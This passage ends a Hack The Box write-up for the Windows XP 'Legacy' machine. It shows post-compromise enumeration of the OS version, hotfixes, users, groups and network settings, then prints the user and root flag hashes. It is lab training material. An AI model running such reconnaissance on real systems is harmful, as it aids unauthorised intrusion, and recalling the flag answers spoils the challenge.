+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v ProductName <span class="z-constant z-character z-escape z-dosbatch">^
+</span></span><span class="z-source z-dosbatch">    <span class="z-keyword z-operator z-conditional z-dosbatch">&amp;&amp;</span> <span class="z-keyword z-command z-dosbatch">reg</span> <span class="z-keyword z-command z-dosbatch">query</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> /v CurrentBuildNumber
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    ProductName REG_SZ  Microsoft Windows XP
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+</span><span class="z-text z-plain">    CurrentBuildNumber  REG_SZ  2600
+</span></code></pre>
+<p>In fact, it's Windows XP build <code>2600</code>.</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-control z-repeat z-dosbatch">for</span> /f <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>tokens=7 delims=\<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-variable z-other z-readwrite z-dosbatch"><span class="z-punctuation z-definition z-variable z-begin z-dosbatch">%</span>a in (&#39;reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix&quot;&#39;) do @echo <span class="z-punctuation z-definition z-variable z-end z-dosbatch">%</span></span>a
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Q147222
+</span></code></pre>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-keyword z-operator z-pipe z-dosbatch">|</span> <span class="z-keyword z-command z-dosbatch">find</span> /V <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's no user.</p>
+<p>What about the administrators?</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span> <span class="z-keyword z-operator z-pipe z-dosbatch">|</span> <span class="z-keyword z-command z-dosbatch">find</span> /V <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Administrator
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's only the built-in <code>Administrator</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">System error 1312 has occurred.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We get an error.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">ipconfig</span> /all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">        Host Name . . . . . . . . . . . . : legacy
+</span><span class="z-text z-plain">        Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">        Node Type . . . . . . . . . . . . : Unknown
+</span><span class="z-text z-plain">        IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">        WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Local Area Connection:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">        Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">        Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
+</span><span class="z-text z-plain">        Physical Address. . . . . . . . . : 00-50-56-B9-99-73
+</span><span class="z-text z-plain">        Dhcp Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">        IP Address. . . . . . . . . . . . : 10.10.10.4
+</span><span class="z-text z-plain">        Subnet Mask . . . . . . . . . . . : 255.255.254.0
+</span><span class="z-text z-plain">        Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">        DNS Servers . . . . . . . . . . . : 1.1.1.1
+</span><span class="z-text z-plain">                                            1.0.0.1
+</span></code></pre>
+<p>There's just an Ethernet interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check <code>john</code>'s Desktop folder, we find the user flag.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\john\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">e69af0e4f443de7e36876fda4ec7644f
+</span></code></pre>
+<p>And as usual, we can find the root flag in <code>Administrator</code>'s Desktop folder.</p>
+<pre data-lang="bat" class="language-bat z-code"><code class="language-bat" data-lang="bat"><span class="z-source z-dosbatch">C:\Windows\system32<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">993442d258b0e0ec917cae9e695d5713
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/legacy/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated both the user and root flags as 'Piece of cake' to obtain. The foothold
+was extremely easy to identify and to exploit (thanks to Metasploit), and it
+even granted us access to the system as <code>NT AUTHORITY\SYSTEM</code>, so there was no
+need to escalate privileges afterwards.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
